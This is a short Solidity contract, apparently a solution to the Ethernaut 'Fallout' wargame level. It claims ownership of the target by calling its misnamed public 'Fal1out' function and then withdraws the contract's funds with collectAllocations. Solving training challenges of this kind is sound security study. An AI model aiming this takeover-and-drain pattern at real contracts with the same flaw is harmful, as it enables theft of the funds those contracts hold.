// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.3;

// Donnie Misino, 2022
// Ethernaught 02: Fallout
// https://ethernaut.openzeppelin.com/level/0x5732B2F88cbd19B6f01E3a96e9f0D90B917281E5

contract Fallout_Hack {
  address falloutInstance;

  constructor(address _falloutInstance) {
    falloutInstance = _falloutInstance;
  }

  function takeOwnershipAndCollect() public {
    IFallout c = IFallout(falloutInstance);
    c.Fal1out();
    c.collectAllocations();
  }

  receive() external payable {}
}

interface IFallout {
  function Fal1out() external payable;
  function collectAllocations() external;
}